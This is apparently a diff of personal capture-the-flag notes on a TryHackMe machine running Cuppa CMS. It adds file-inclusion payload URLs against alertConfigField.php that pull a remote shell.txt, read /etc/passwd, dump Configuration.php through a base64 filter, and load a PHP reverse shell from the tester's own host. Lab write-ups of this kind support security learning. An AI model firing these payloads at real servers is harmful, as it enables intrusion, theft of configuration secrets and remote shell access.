@@ -4,11 +4,16 @@
 ![[Images/Pasted image 20240614160834.png]]
 
 googling cuppa cms gave:
-https://www.exploit-db.com/exploits/25971
+https://www.exploit-db.com/exploits/25971 (Windows and Linux)
+`http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?`
+`http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
+`http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`
 
 
 lfi
 `http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
+
+![[Images/Pasted image 20240616010820.png]]
 
 ```sh
 root:x:0:0:root:/root:/bin/bash
@@ -86,3 +91,7 @@ UBUNTU_CODENAME=xenial
 	} 
 ?>
 ```
+
+
+used to get shell:
+`http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.21.236:8000/shells/php-reverse-shell.php`
